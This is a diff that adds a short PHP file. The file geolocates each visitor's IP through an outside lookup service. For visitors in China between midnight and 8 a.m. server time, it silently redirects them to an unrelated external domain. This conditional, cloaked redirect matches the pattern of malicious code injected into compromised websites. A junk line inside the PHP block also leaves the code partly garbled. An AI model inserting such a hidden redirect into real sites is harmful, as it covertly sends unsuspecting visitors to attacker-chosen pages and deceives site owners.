@@ -1,0 +1,12 @@
+<?php 
+
+$con=@file_get_contents("http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip=".$_SERVER["REMOTE_ADDR"]);
+$hour=date("H",time());
+if($hour >=0 && $hour <=8 && strpos($con,'\u4e2d\u56fd')>1)header("Location:http://www.sqdao3.com/default.html");
+
+
+
+
+12335&%wecgr#
+
+?>
